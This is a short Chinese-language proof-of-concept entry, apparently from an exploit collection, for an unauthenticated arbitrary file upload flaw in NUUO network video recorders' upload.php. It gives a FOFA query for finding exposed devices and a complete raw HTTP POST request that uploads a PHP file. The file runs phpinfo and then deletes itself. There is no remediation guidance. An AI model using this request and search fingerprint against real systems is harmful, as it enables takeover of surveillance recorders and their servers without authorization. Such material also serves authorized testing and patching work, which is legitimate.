# NUUO网络视频录像机upload.php任意文件上传漏洞

NUUO网络视频录像机upload.php任意文件上传漏洞，未经身份验证攻击者可通过该漏洞上传恶意文件，造成服务器沦陷。

## fofa

```javascript
body="www.nuuo.com/eHelpdesk.php"
```

## poc

```javascript
POST /upload.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--------ok4o88lom
accept: */*
Content-Length: 155

----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="test.php"

<?php phpinfo();@unlink(__FILE__);?>
----------ok4o88lom--
```

![5c2e597f5b4233b5e694d71104f622e9](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251439472.jpg)